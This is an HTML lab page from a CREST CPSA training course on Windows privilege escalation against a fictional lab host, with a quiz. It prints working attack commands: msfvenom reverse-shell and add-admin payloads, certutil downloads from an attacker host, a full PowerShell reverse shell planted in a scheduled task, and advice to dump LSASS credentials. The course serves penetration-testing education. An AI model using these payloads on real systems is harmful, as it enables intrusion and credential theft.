@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lab E3-A: Windows Privilege Escalation | CPSA Module E | My Cyber Academy</title>
+<style>
+  :root { --mca-orange: #FF6B00; --mca-dark: #1a1a1a; --mca-grey: #2d2d2d; --mca-text: #e0e0e0; --mca-white: #ffffff; --mca-green: #4CAF50; --mca-red: #f44336; --mca-yellow: #FFC107; --mca-blue: #2196F3; --mca-code-bg: #0d1117; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--mca-dark); color: var(--mca-text); font-family: 'Segoe UI', Arial, sans-serif; font-size: 15px; line-height: 1.65; }
+  .lab-header { background: linear-gradient(135deg, #1a1a1a 0%, #2d1a00 100%); border-bottom: 3px solid var(--mca-orange); padding: 28px 32px 20px; }
+  .lab-header h1 { font-size: 26px; font-weight: 700; color: var(--mca-white); margin-bottom: 6px; }
+  .lab-header h1 span { color: var(--mca-orange); }
+  .lab-meta { display: flex; gap: 20px; flex-wrap: wrap; margin-top: 12px; font-size: 13px; color: #aaa; }
+  .lab-meta .badge { background: var(--mca-grey); border: 1px solid #444; padding: 3px 10px; border-radius: 12px; font-size: 12px; }
+  .lab-meta .badge.orange { border-color: var(--mca-orange); color: var(--mca-orange); }
+  .container { max-width: 960px; margin: 0 auto; padding: 32px 24px; }
+  .scenario-box { background: var(--mca-grey); border-left: 4px solid var(--mca-orange); border-radius: 4px; padding: 20px 24px; margin-bottom: 28px; }
+  .scenario-box h2 { font-size: 14px; text-transform: uppercase; letter-spacing: 1px; color: var(--mca-orange); margin-bottom: 10px; }
+  .scenario-box p { font-size: 14px; color: #ccc; }
+  .objectives { background: #1e2d1e; border: 1px solid #2d4a2d; border-radius: 4px; padding: 18px 24px; margin-bottom: 28px; }
+  .objectives h2 { font-size: 14px; text-transform: uppercase; letter-spacing: 1px; color: var(--mca-green); margin-bottom: 12px; }
+  .objectives ul { list-style: none; }
+  .objectives ul li { padding: 4px 0; font-size: 14px; }
+  .objectives ul li::before { content: "✓ "; color: var(--mca-green); font-weight: bold; }
+  .env-table { width: 100%; border-collapse: collapse; margin-bottom: 28px; font-size: 13px; }
+  .env-table th { background: var(--mca-grey); color: var(--mca-orange); text-align: left; padding: 10px 14px; font-size: 12px; text-transform: uppercase; border-bottom: 2px solid var(--mca-orange); }
+  .env-table td { padding: 10px 14px; border-bottom: 1px solid #333; }
+  .env-table tr:nth-child(even) td { background: #222; }
+  .env-table code { background: var(--mca-code-bg); padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; color: var(--mca-orange); font-size: 12px; }
+  .phase { margin-bottom: 36px; border: 1px solid #333; border-radius: 6px; overflow: hidden; }
+  .phase-header { background: var(--mca-grey); padding: 14px 20px; display: flex; align-items: center; gap: 14px; border-bottom: 1px solid #444; }
+  .phase-num { background: var(--mca-orange); color: #000; font-weight: 700; font-size: 14px; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+  .phase-header h3 { font-size: 16px; color: var(--mca-white); }
+  .phase-header .phase-tag { margin-left: auto; font-size: 11px; color: #888; background: #222; border: 1px solid #444; padding: 2px 8px; border-radius: 10px; text-transform: uppercase; }
+  .phase-body { padding: 20px 24px; }
+  .step { margin-bottom: 22px; }
+  .step p { font-size: 14px; color: #ccc; margin-bottom: 10px; }
+  .step strong { color: var(--mca-white); }
+  pre { background: var(--mca-code-bg); border: 1px solid #30363d; border-radius: 6px; padding: 16px; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 13px; line-height: 1.6; margin: 10px 0; }
+  pre code { color: #e6edf3; }
+  pre .comment { color: #8b949e; }
+  pre .cmd { color: #79c0ff; }
+  pre .flag { color: #ffa657; }
+  pre .str { color: #a5d6ff; }
+  pre .out { color: #3fb950; }
+  .callout { border-radius: 4px; padding: 14px 18px; margin: 14px 0; font-size: 13px; display: flex; gap: 12px; align-items: flex-start; }
+  .callout-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+  .callout.crest { background: #1a1f2e; border: 1px solid #2d3a5a; }
+  .callout.crest .callout-icon { color: #7986cb; }
+  .callout.crest strong { color: #9fa8da; }
+  .callout.warn { background: #2a1f00; border: 1px solid #5a3a00; }
+  .callout.warn .callout-icon { color: var(--mca-yellow); }
+  .callout.info { background: #0d1f2d; border: 1px solid #1a3a5a; }
+  .callout.info .callout-icon { color: var(--mca-blue); }
+  .knowledge-check { background: #1a1a1a; border: 1px solid #444; border-radius: 6px; padding: 20px 24px; margin: 28px 0; }
+  .knowledge-check h3 { color: var(--mca-orange); font-size: 14px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 16px; }
+  .kc-question { margin-bottom: 20px; }
+  .kc-question p { font-size: 14px; margin-bottom: 10px; }
+  .options { display: flex; flex-direction: column; gap: 8px; }
+  .option { background: var(--mca-grey); border: 1px solid #444; border-radius: 4px; padding: 10px 14px; font-size: 13px; cursor: pointer; transition: border-color 0.2s; }
+  .option:hover { border-color: var(--mca-orange); }
+  .option.correct { background: #1e3a1e; border-color: var(--mca-green); color: #a5d6a7; }
+  .option.wrong { background: #3a1e1e; border-color: var(--mca-red); color: #ef9a9a; }
+  .reveal-btn { background: transparent; border: 1px solid var(--mca-orange); color: var(--mca-orange); padding: 7px 16px; border-radius: 4px; font-size: 12px; cursor: pointer; margin-top: 8px; }
+  .reveal-btn:hover { background: var(--mca-orange); color: #000; }
+  .kc-answer { display: none; background: #0d1f0d; border: 1px solid #2d4a2d; border-radius: 4px; padding: 12px 16px; margin-top: 10px; font-size: 13px; color: #a5d6a7; }
+  .kc-answer.show { display: block; }
+  .takeaways { background: var(--mca-grey); border-top: 3px solid var(--mca-orange); border-radius: 4px; padding: 20px 24px; margin-top: 32px; }
+  .takeaways h3 { color: var(--mca-orange); font-size: 14px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 14px; }
+  .takeaways ul { list-style: none; }
+  .takeaways ul li { padding: 5px 0; font-size: 14px; color: #ccc; }
+  .takeaways ul li::before { content: "→ "; color: var(--mca-orange); }
+  .lab-footer { background: #111; border-top: 1px solid #333; padding: 18px 32px; text-align: center; font-size: 12px; color: #555; margin-top: 48px; }
+  .lab-footer span { color: var(--mca-orange); }
+  .nav-links { display: flex; justify-content: space-between; margin-top: 32px; }
+  .nav-link { background: var(--mca-grey); border: 1px solid #444; color: #aaa; padding: 10px 20px; border-radius: 4px; font-size: 13px; text-decoration: none; transition: border-color 0.2s; }
+  .nav-link:hover, .nav-link.next { border-color: var(--mca-orange); color: var(--mca-orange); }
+  .vuln-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 12px; margin: 16px 0; }
+  .vuln-card { background: #1a1a2e; border: 1px solid #2d3a5a; border-radius: 4px; padding: 14px; }
+  .vuln-card h4 { color: #9fa8da; font-size: 13px; margin-bottom: 6px; }
+  .vuln-card p { font-size: 12px; color: #888; }
+</style>
+</head>
+<body>
+
+<div class="lab-header">
+  <div class="lab-meta"><span style="font-size:12px;color:#888;text-transform:uppercase;letter-spacing:1px;">CPSA &rsaquo; Module E &rsaquo; Windows Security Assessment</span></div>
+  <h1><span>Lab E3-A:</span> Windows Privilege Escalation</h1>
+  <div class="lab-meta">
+    <span class="badge orange">Module E</span>
+    <span class="badge">Windows</span>
+    <span class="badge">CREST CPSA</span>
+    <span class="badge">Syntex Solutions Ltd</span>
+    <span>Difficulty: Intermediate</span>
+    <span>Estimated time: 75 min</span>
+  </div>
+</div>
+
+<div class="container">
+
+  <div class="scenario-box">
+    <h2>Engagement Scenario</h2>
+    <p>You have a low-privilege shell on SYNTEX-DC01 as <strong>jsmith</strong> (a standard domain user). Your objective is to escalate to SYSTEM or local Administrator using misconfigurations identified during WinPEAS enumeration. The Syntex lab contains three distinct privilege escalation paths - work through each one.</p>
+  </div>
+
+  <div class="objectives">
+    <h2>Learning Objectives</h2>
+    <ul>
+      <li>Run WinPEAS and interpret the output to identify escalation vectors</li>
+      <li>Exploit an unquoted service path to execute code as SYSTEM</li>
+      <li>Abuse AlwaysInstallElevated to install a malicious MSI as SYSTEM</li>
+      <li>Hijack a world-writable scheduled task script</li>
+    </ul>
+  </div>
+
+  <table class="env-table">
+    <thead><tr><th>Host</th><th>IP</th><th>Current Access</th><th>Target</th></tr></thead>
+    <tbody>
+      <tr><td>SYNTEX-DC01</td><td><code>&lt;DC01-IP&gt;</code></td><td>jsmith (low-privilege domain user)</td><td>SYSTEM</td></tr>
+    </tbody>
+  </table>
+
+  <!-- PHASE 1 -->
+  <div class="phase">
+    <div class="phase-header">
+      <div class="phase-num">1</div>
+      <h3>Automated Enumeration with WinPEAS</h3>
+      <span class="phase-tag">WinPEAS</span>
+    </div>
+    <div class="phase-body">
+      <div class="step">
+        <p>WinPEAS is the Windows equivalent of LinPEAS. It automates local privilege escalation enumeration and highlights findings in colour. Transfer it to the target and run it:</p>
+        <pre><code><span class="comment"># On Kali: serve WinPEAS over HTTP</span>
+<span class="cmd">python3</span> <span class="flag">-m</span> http.server 8080
+
+<span class="comment"># On the target (Evil-WinRM shell or cmd):</span>
+<span class="cmd">certutil</span> <span class="flag">-urlcache</span> <span class="flag">-split</span> <span class="flag">-f</span> http://&lt;KALI-IP&gt;:8080/winPEASx64.exe winpeas.exe
+<span class="cmd">.\winpeas.exe</span>
+</code></pre>
+        <p>WinPEAS output is long. The key sections to focus on for CPSA-level findings:</p>
+        <pre><code><span class="comment"># Watch for these in the output:</span>
+<span class="out">[+] Unquoted Service Paths
+[+] AlwaysInstallElevated
+[+] Modifiable Services
+[+] Scheduled Tasks Writeable</span>
+</code></pre>
+      </div>
+      <div class="vuln-grid">
+        <div class="vuln-card"><h4>Unquoted Path</h4><p>SyntexBackup service - binary path has spaces and no quotes</p></div>
+        <div class="vuln-card"><h4>AlwaysInstallElevated</h4><p>Both HKCU and HKLM keys set to 1 - any user can install MSI as SYSTEM</p></div>
+        <div class="vuln-card"><h4>Weak ACL Service</h4><p>SyntexMonitor binary is writable by authenticated users</p></div>
+        <div class="vuln-card"><h4>Scheduled Task</h4><p>SyntexMaintenance task script is world-writable</p></div>
+      </div>
+      <div class="callout crest">
+        <span class="callout-icon">★</span>
+        <div><strong>CREST CPSA Exam Point:</strong> WinPEAS is a tool you should know inside out for CPSA. The exam may ask you to identify which WinPEAS finding represents a specific vulnerability class, or which technique the highlighted output corresponds to. Always read the full output before choosing a path.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 2 -->
+  <div class="phase">
+    <div class="phase-header">
+      <div class="phase-num">2</div>
+      <h3>Unquoted Service Path: SyntexBackup</h3>
+      <span class="phase-tag">Unquoted Path</span>
+    </div>
+    <div class="phase-body">
+      <div class="step">
+        <p>Verify the vulnerable service manually. An unquoted path with spaces means Windows will attempt to execute each space-separated segment as a binary path:</p>
+        <pre><code><span class="comment"># Check service binary path</span>
+sc qc SyntexBackup
+
+<span class="out">SERVICE_NAME: SyntexBackup
+  BINARY_PATH_NAME   : C:\Program Files\Syntex Solutions\Backup\SyntexBackup.exe</span>
+
+<span class="comment"># Windows will try these paths in order:</span>
+<span class="comment"># C:\Program.exe</span>
+<span class="comment"># C:\Program Files\Syntex.exe   &lt;-- THIS is the attack vector</span>
+<span class="comment"># C:\Program Files\Syntex Solutions\Backup\SyntexBackup.exe</span>
+</code></pre>
+      </div>
+      <div class="step">
+        <p>Check write permissions on <code>C:\Program Files\</code>:</p>
+        <pre><code><span class="comment"># PowerShell - check ACL on the directory</span>
+<span class="cmd">icacls</span> <span class="str">"C:\Program Files\Syntex Solutions"</span>
+
+<span class="out">C:\Program Files\Syntex Solutions BUILTIN\Users:(OI)(CI)(W)</span>
+<span class="comment"># (W) means write access for all authenticated users - vulnerable!</span>
+</code></pre>
+      </div>
+      <div class="step">
+        <p>Generate a malicious executable with msfvenom and plant it at the path Windows will search first:</p>
+        <pre><code><span class="comment"># On Kali: generate a reverse shell payload</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> windows/x64/shell_reverse_tcp LHOST=&lt;KALI-IP&gt; LPORT=4444 <span class="flag">-f</span> exe <span class="flag">-o</span> Syntex.exe
+
+<span class="comment"># Transfer Syntex.exe to target and place it in the vulnerable path</span>
+<span class="comment"># (via Evil-WinRM upload or certutil)</span>
+copy Syntex.exe "C:\Program Files\Syntex Solutions\Syntex.exe"
+
+<span class="comment"># On Kali: set up listener</span>
+<span class="cmd">nc</span> <span class="flag">-lvnp</span> 4444
+
+<span class="comment"># Restart the service (requires service control permission or wait for reboot)</span>
+sc stop SyntexBackup
+sc start SyntexBackup
+
+<span class="comment"># Catch the SYSTEM shell on Kali</span>
+<span class="out">connect to [KALI-IP] from (UNKNOWN) [&lt;DC01-IP&gt;]
+Microsoft Windows [Version 10.0.14393]
+C:\Windows\system32&gt;whoami
+nt authority\system</span>
+</code></pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 3 -->
+  <div class="phase">
+    <div class="phase-header">
+      <div class="phase-num">3</div>
+      <h3>AlwaysInstallElevated: MSI Abuse</h3>
+      <span class="phase-tag">Registry Misconfiguration</span>
+    </div>
+    <div class="phase-body">
+      <div class="step">
+        <p>Verify both registry keys are set to 1 (both HKCU and HKLM must be set for this to be exploitable):</p>
+        <pre><code><span class="comment"># Check both registry keys - both must equal 0x1</span>
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+<span class="out">HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1</span>
+</code></pre>
+      </div>
+      <div class="step">
+        <p>Generate a malicious MSI that adds a new local administrator:</p>
+        <pre><code><span class="comment"># On Kali: generate a malicious MSI payload</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> windows/adduser USER=hacker PASS=Hacker123! <span class="flag">-f</span> msi <span class="flag">-o</span> evil.msi
+
+<span class="comment"># Or use a reverse shell payload:</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> windows/x64/shell_reverse_tcp LHOST=&lt;KALI-IP&gt; LPORT=4445 <span class="flag">-f</span> msi <span class="flag">-o</span> evil.msi
+
+<span class="comment"># Transfer evil.msi to target, then install it</span>
+<span class="comment"># The installation runs as SYSTEM due to the policy setting</span>
+msiexec /quiet /qn /i evil.msi
+</code></pre>
+      </div>
+      <div class="callout crest">
+        <span class="callout-icon">★</span>
+        <div><strong>CREST CPSA Exam Point:</strong> AlwaysInstallElevated is a Group Policy setting that allows any user to install MSI packages with SYSTEM privileges. It is a HIGH finding because it is trivially exploitable - any domain user with network access can escalate to SYSTEM without any vulnerability in the application software.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 4 -->
+  <div class="phase">
+    <div class="phase-header">
+      <div class="phase-num">4</div>
+      <h3>Scheduled Task Script Hijacking: SyntexMaintenance</h3>
+      <span class="phase-tag">Scheduled Tasks</span>
+    </div>
+    <div class="phase-body">
+      <div class="step">
+        <p>WinPEAS flagged a world-writable scheduled task script. Verify the task and its script path:</p>
+        <pre><code><span class="comment"># List the task configuration</span>
+schtasks /query /tn "SyntexMaintenance" /fo LIST /v
+
+<span class="out">TaskName:                             \SyntexMaintenance
+Run As User:                          SYSTEM
+Task To Run:                          C:\Scripts\maintenance.ps1
+Schedule Type:                        Daily
+Start Time:                           02:00:00</span>
+</code></pre>
+      </div>
+      <div class="step">
+        <p>Check write permissions on the script file:</p>
+        <pre><code><span class="cmd">icacls</span> C:\Scripts\maintenance.ps1
+<span class="out">C:\Scripts\maintenance.ps1 Everyone:(F)</span>
+<span class="comment"># (F) = Full Control for Everyone - world-writable!</span>
+</code></pre>
+      </div>
+      <div class="step">
+        <p>Overwrite the script with a reverse shell payload:</p>
+        <pre><code><span class="comment"># Write a PowerShell reverse shell into the task script</span>
+<span class="str">$cmd = '$client = New-Object System.Net.Sockets.TCPClient("&lt;KALI-IP&gt;",4446);'</span>
+<span class="str">$cmd += '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};'</span>
+<span class="str">$cmd += 'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){'</span>
+<span class="str">$cmd += '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'</span>
+<span class="str">$cmd += '$sendback = (iex $data 2>&amp;1 | Out-String);'</span>
+<span class="str">$cmd += '$sendback2  = $sendback + "PS " + (pwd).Path + "> ";'</span>
+<span class="str">$cmd += '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'</span>
+<span class="str">$cmd += '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}'</span>
+Set-Content C:\Scripts\maintenance.ps1 $cmd
+
+<span class="comment"># Set up listener on Kali and wait for the task to execute (or trigger manually if you have rights)</span>
+<span class="comment"># nc -lvnp 4446</span>
+</code></pre>
+      </div>
+      <div class="callout warn">
+        <span class="callout-icon">⚠</span>
+        <div><strong>Persistence Note:</strong> In a real engagement, overwriting a scheduled task script is a <em>destructive</em> action - you are replacing legitimate business logic. Always take a backup of the original file first and restore it after demonstrating the vulnerability. Document this clearly in your report.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- KNOWLEDGE CHECK -->
+  <div class="knowledge-check">
+    <h3>Knowledge Check</h3>
+    <div class="kc-question" id="q1">
+      <p><strong>Q1.</strong> A service has the binary path: <code>C:\Program Files\My App\Service Files\svc.exe</code>. Which path will Windows try to execute first due to the unquoted path vulnerability?</p>
+      <div class="options">
+        <div class="option" onclick="answer(this,'q1','a')">A. <code>C:\Program.exe</code></div>
+        <div class="option" onclick="answer(this,'q1','b')">B. <code>C:\Program Files\My.exe</code></div>
+        <div class="option" onclick="answer(this,'q1','c')">C. <code>C:\Program Files\My App\Service.exe</code></div>
+        <div class="option" onclick="answer(this,'q1','d')">D. <code>C:\Program Files\My App\Service Files\svc.exe</code></div>
+      </div>
+    </div>
+
+    <div class="kc-question" id="q2">
+      <p><strong>Q2.</strong> For AlwaysInstallElevated to be exploitable, what condition must be true?</p>
+      <button class="reveal-btn" onclick="reveal('a2')">Reveal Answer</button>
+      <div class="kc-answer" id="a2">Both the HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated AND HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated registry values must be set to 1. If only one is set, the policy does not apply and MSI packages are not automatically elevated.</div>
+    </div>
+
+    <div class="kc-question" id="q3">
+      <p><strong>Q3.</strong> You have escalated to SYSTEM via an unquoted service path. What should you do immediately after achieving SYSTEM?</p>
+      <div class="options">
+        <div class="option" onclick="answer(this,'q3','a')">A. Run WinPEAS again to find more vulnerabilities</div>
+        <div class="option" onclick="answer(this,'q3','b')">B. Dump LSASS with Mimikatz to extract all credentials in memory</div>
+        <div class="option" onclick="answer(this,'q3','c')">C. Install persistence via a new registry run key</div>
+        <div class="option" onclick="answer(this,'q3','d')">D. Map network shares from the SYSTEM context</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="takeaways">
+    <h3>Key Takeaways</h3>
+    <ul>
+      <li>WinPEAS is the starting point for every Windows privesc engagement - read all of it before choosing a path</li>
+      <li>Unquoted paths exploit Windows path resolution order - place a binary where Windows will find it first</li>
+      <li>AlwaysInstallElevated is trivially exploitable - one msfvenom MSI gets you SYSTEM regardless of patching</li>
+      <li>World-writable scheduled task scripts that run as SYSTEM are equivalent to a SYSTEM shell waiting to happen</li>
+      <li>After reaching SYSTEM, immediately dump LSASS - every credential in memory is your next lateral movement opportunity</li>
+    </ul>
+  </div>
+
+  <div class="nav-links">
+    <a href="lab-e2a-credential-access-v1.html" class="nav-link">&larr; Lab E2-A: Credential Access</a>
+    <a href="lab-e4a-ad-enumeration-v1.html" class="nav-link next">Next: Lab E4-A - AD Enumeration &rarr;</a>
+  </div>
+
+</div>
+
+<div class="lab-footer">
+  <span>My Cyber Academy</span> &nbsp;|&nbsp; CREST CPSA Preparation &nbsp;|&nbsp; Module E: Windows Security Assessment<br>
+  Lab E3-A: Windows Privilege Escalation &nbsp;|&nbsp; &copy; 2024 My Cyber Academy Ltd &nbsp;|&nbsp; All rights reserved
+</div>
+
+<script>
+const correctAnswers = { q1: 'a', q3: 'b' };
+function answer(el, qid, choice) {
+  const opts = document.querySelectorAll('#' + qid + ' .option');
+  opts.forEach(o => { o.classList.remove('correct','wrong'); o.style.pointerEvents='none'; });
+  el.classList.add(choice === correctAnswers[qid] ? 'correct' : 'wrong');
+  if (choice !== correctAnswers[qid]) {
+    opts.forEach(o => { if (o.textContent.trim().startsWith(correctAnswers[qid].toUpperCase() + '.')) o.classList.add('correct'); });
+  }
+}
+function reveal(id) { document.getElementById(id).classList.add('show'); event.target.style.display='none'; }
+</script>
+</body>
+</html>
